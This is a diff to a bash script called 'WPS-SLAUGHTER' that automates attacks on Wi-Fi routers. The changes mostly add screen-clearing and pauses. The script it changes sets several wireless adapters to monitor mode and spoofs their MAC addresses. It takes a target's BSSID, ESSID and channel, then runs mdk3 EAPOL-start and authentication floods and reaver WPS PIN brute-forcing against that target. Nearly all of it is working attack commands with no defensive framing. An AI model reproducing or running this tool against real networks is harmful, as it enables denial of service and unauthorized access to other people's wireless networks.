@@ -1,4 +1,5 @@
 #!/bin/bash
+clear
 declare BSSID;
 declare ESSID;
 declare CHANNEL;
@@ -20,6 +21,9 @@ echo "
 
 echo "WPS-SLAUGHTER BY: APATHETIC EUPHORIA"
 
+sleep 3
+clear
+
 sudo rfkill unblock all
 
 echo "************** - How Many Wlan Adapters Would You Like To Use? - ************** 
@@ -32,11 +36,13 @@ echo "************** - How Many Wlan Adapters Would You Like To Use? - *********
 read a
 case $a in
 	1)
+clear
 
 echo 
 read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
 
-echo "------------------------------"
+clear
+
 echo "Enabling Monitor Mode"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -44,7 +50,10 @@ sudo iwconfig $ADAPTER1 mode monitor
 sleep 3
 sudo ifconfig $ADAPTER1 up
 echo "Monitor Mode Enabled"
-echo "------------------------------"
+
+sleep 1
+
+clear
 
 echo "************** - Would you like to Change the Wlan Adapter's MAC Address? - ************** 
 1)Yes
@@ -53,7 +62,8 @@ echo "************** - Would you like to Change the Wlan Adapter's MAC Address? 
 read c
 case $c in
 	1)
-echo "------------------------------"
+clear
+
 echo "Setting the MAC Address"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -61,8 +71,10 @@ macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
 sleep 3
 sudo ifconfig $ADAPTER1 up
 echo "MAC Changed"
-echo "------------------------------"
 
+sleep 1
+
+clear
 ;;
 	2)
 ;;
@@ -74,16 +86,17 @@ gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $AD
 
 echo 
 read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
-
+clear
 echo 
 read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
-
+clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
-echo "-------------------------------------"
 
+clear
 
 menu () {
+clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
 1)EAPOL Start Flood 
 2)Authentication Flood
@@ -93,18 +106,22 @@ echo "************** - Which Attack Would You Like To Use? - **************
 read d
 case $d in
 	1)
+clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
+clear
 timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m
 menu
 ;;
 	3)
+clear
 reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
+clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 menu
 ;;
@@ -118,14 +135,14 @@ menu
 
 ;;
 	2)
+clear
 
 echo 
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
-
+clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
-
-echo "------------------------------"
+clear
 echo "Enabling Monitor Mode"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -138,7 +155,8 @@ sudo iwconfig $ADAPTER2 mode monitor
 sleep 3
 sudo ifconfig $ADAPTER2 up
 echo "Monitor Mode Enabled"
-echo "------------------------------"
+sleep 1
+clear
 
 echo "************** - Would you like to set the 2 Adapters to an Identical MAC Address? - ************** 
 1)Yes
@@ -147,7 +165,7 @@ echo "************** - Would you like to set the 2 Adapters to an Identical MAC 
 read f
 case $f in
 	1)
-echo "------------------------------"
+clear
 echo "Setting the MAC Address"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -159,8 +177,9 @@ sleep 3
 macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
 sleep 3
 sudo ifconfig $ADAPTER2 up
-echo "MAC Changed"
-echo "------------------------------"
+echo "MACs Changed"
+sleep 1
+clear
 ;;
 	2)
 ;;
@@ -173,16 +192,18 @@ esac
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 
 echo 
+clear
 read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
-
+clear
 echo 
 read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
-
+clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
-echo "-------------------------------------"
+clear
 
 menu () {
+clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
 1)EAPOL Start Flood 
 2)Authentication Flood
@@ -192,18 +213,22 @@ echo "************** - Which Attack Would You Like To Use? - **************
 read g
 case $g in
 	1)
+clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
+clear
 timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
 menu
 ;;
 	3)
+clear
 reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
+clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 menu
 ;;
@@ -218,17 +243,17 @@ menu
 
 ;;
 	3)
-
+clear
 echo 
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
-
+clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
-
+clear
 echo 
 read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
+clear
 
-echo "------------------------------"
 echo "Enabling Monitor Mode"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -246,7 +271,8 @@ sudo iwconfig $ADAPTER3 mode monitor
 sleep 3
 sudo ifconfig $ADAPTER3 up
 echo "Monitor Mode Enabled"
-echo "------------------------------"
+sleep 1
+clear
 
 echo "************** - Would you like to set the 3 Adapters to an Identical MAC Address? - ************** 
 1)Yes
@@ -255,7 +281,7 @@ echo "************** - Would you like to set the 3 Adapters to an Identical MAC 
 read i
 case $i in
 	1)
-echo "------------------------------"
+clear
 echo "Setting the MAC Address"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -272,8 +298,9 @@ sleep 3
 macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
 sleep 3
 sudo ifconfig $ADAPTER3 up
-echo "MAC Changed"
-echo "------------------------------"
+echo "MACs Changed"
+sleep 1
+clear
 ;;
 	2)
 ;;
@@ -285,15 +312,16 @@ gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $AD
 
 echo 
 read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
-
+clear
 echo 
 read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
-
+clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
 echo "-------------------------------------"
-
+clear
 menu () {
+clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
 1)EAPOL Start Flood 
 2)Authentication Flood
@@ -303,18 +331,22 @@ echo "************** - Which Attack Would You Like To Use? - **************
 read j
 case $j in
 	1)
+clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
+clear
 timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
 menu
 ;;
 	3)
+clear
 reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
+clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 menu
 ;;
@@ -328,19 +360,20 @@ menu
 
 ;;
 	4)
+clear
 echo 
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
-
+clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
-
+clear
 echo 
 read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
-
+clear
 echo 
 read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
+clear
 
-echo "------------------------------"
 echo "Enabling Monitor Mode"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -363,7 +396,8 @@ sudo iwconfig $ADAPTER4 mode monitor
 sleep 3
 sudo ifconfig $ADAPTER4 up
 echo "Monitor Mode Enabled"
-echo "------------------------------"
+sleep 1
+clear
 
 echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
 1)Yes
@@ -372,7 +406,7 @@ echo "************** - Would you like to set ALL Wlan Adapters to the same MAC A
 read l
 case $l in
 	1)
-echo "------------------------------"
+clear
 echo "Setting All Wlan MAC Addresses to Identical MAC"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -395,7 +429,8 @@ macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
 sleep 3
 sudo ifconfig $ADAPTER4 up
 echo "MACs Changed"
-echo "------------------------------"
+sleep 1
+clear
 ;;
 	2)
 ;;
@@ -403,20 +438,21 @@ echo "------------------------------"
 ;;
 esac
 
-
+clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 
 echo 
 read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
-
+clear
 echo 
 read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
-
+clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
-echo "-------------------------------------"
+clear
 
 menu () {
+clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
 1)EAPOL Start Flood 
 2)Authentication Flood
@@ -426,18 +462,22 @@ echo "************** - Which Attack Would You Like To Use? - **************
 read m
 case $m in
 	1)
+clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
+clear
 timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
 menu
 ;;
 	3)
+clear
 reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
+clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 menu
 ;;
@@ -451,23 +491,22 @@ menu
 
 ;;
 	5)
-
+clear
 echo 
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
-
+clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
-
+clear
 echo 
 read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
-
+clear
 echo 
 read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
-
+clear
 echo 
 read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": ADAPTER5;
-
-echo "------------------------------"
+clear
 echo "Enabling Monitor Mode"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -495,7 +534,8 @@ sudo iwconfig $ADAPTER5 mode monitor
 sleep 3
 sudo ifconfig $ADAPTER5 up
 echo "Monitor Mode Enabled"
-echo "------------------------------"
+sleep 1
+clear
 
 echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
 1)Yes
@@ -504,7 +544,7 @@ echo "************** - Would you like to set ALL Wlan Adapters to the same MAC A
 read o
 case $o in
 	1)
-echo "------------------------------"
+clear
 echo "Setting All Wlan MAC Addresses to Identical MAC"
 sudo ifconfig $ADAPTER1 down
 sleep 3
@@ -532,7 +572,8 @@ macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
 sleep 3
 sudo ifconfig $ADAPTER5 up
 echo "MACs Changed"
-echo "------------------------------"
+sleep 1
+clear
 ;;
 	2)
 ;;
@@ -542,18 +583,19 @@ esac
 
 
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
-
+clear
 echo 
 read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
-
+clear
 echo 
 read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
-
+clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
 echo "-------------------------------------"
-
+clear
 menu () {
+clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
 1)EAPOL Start Flood 
 2)Authentication Flood
@@ -563,18 +605,22 @@ echo "************** - Which Attack Would You Like To Use? - **************
 read p
 case $p in
 	1)
+clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
+clear
 timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
 menu
 ;;
 	3)
+clear
 reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
+clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 menu
 ;;
